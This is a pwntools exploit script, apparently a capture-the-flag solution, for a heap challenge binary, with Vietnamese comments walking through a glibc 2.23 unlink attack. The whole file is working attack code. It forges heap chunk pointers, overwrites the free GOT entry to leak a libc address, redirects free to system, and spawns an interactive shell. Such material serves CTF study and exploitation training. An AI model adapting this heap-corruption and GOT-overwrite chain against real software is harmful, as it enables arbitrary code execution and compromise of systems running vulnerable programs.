from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
b* 0x400a6e
b* 0x400b20
b* 0x400b62
b* 0x400c29
continue
'''.format(**locals())

#Binary filename
exe = './4-ReeHY-main'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")

'''
-Cach 2: unlink attack (libc2.23)
+ Đầu tiên là sử dụng DoubleFree không thành công nên chung ta chuyển hướng sang unlink attack
+ Các bước tiến hành:
1, Allocate 2 non-tcache va free chung => bypass double free detection
2, Allocate 1 chunk (large chunk) có thể chứa được 2 chunk chúng ta vừa free, Data viết vào chunk này ta phải viết p->fd = p->bk = Addr của fake chunk chúng ta muốn (tránh lỗi corrupted double-linked list)(chi tiết mình comment bên dưới dòng payload)
3, Free chunk vừa tạo sẽ bypass đc check free và edit được
4, Edit chuyển free_got thành puts_plt để leak atoi (bất kỳ hàm nào) và
calc libc_base
5, Edit chuyển free_got thành system của libc để leak atoi
6, tạo chunk chứa /bin/sh và thực hiện Free()
==> get shell
'''

def create(size, cun, data):
    p.sendlineafter('$ ', '1')
    p.sendlineafter('Input size\n', str(size))
    p.sendlineafter('Input cun\n', str(cun))
    p.sendafter('Input content\n', (data))

def delete(cun):
    p.sendlineafter('$ ', '2')
    p.sendlineafter('Chose one to dele\n', str(cun))

def edit(cun, data):
    p.sendlineafter('$ ', '3')
    p.sendlineafter("Chose one to edit\n", str(cun))
    p.sendafter("Input the content\n", data)

heap_got = 0x602100
p.sendlineafter("$ ", "TheHoods")

create(0x200, 0, "/bin/sh\x00")
create(0x200, 1, "1")
create(0x200, 2, "2")
create(0x200, 3, "3")
delete(3)
delete(2)
payload = p64(0)                #fake prev_chunk size
payload += p64(0x201)           #fake chunk size
payload += p64(heap_got - 0x18) #fake fd  
payload += p64(heap_got - 0x10) #fake bk

payload += b"a" * (0x200 - 0x20)#junk
payload += p64(0x200)           #fake prev_chunk size 
payload += p64(0x200)           #fake chunk_size
create(0x400, 2, payload)

delete(3)                       #Trigger unlink

payload = 0x18*b'1'
payload += p64(elf.got.free) + p64(1) #change chunk 2 elf.got.free va inuse
payload += p64(elf.got.atoi) + p64(1) #change chunk 3 elf.got.atoi va inuse
edit(2, payload)
edit(2, p64(elf.plt.puts))            #thay got_free = plt_puts
delete(3)

leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("leak = "+ hex(leak))
libc.address = leak - libc.sym['atoi']
log.info("libc = " + hex(libc.address))

edit(2, p64(libc.sym['system']))
delete(0)
p.interactive()
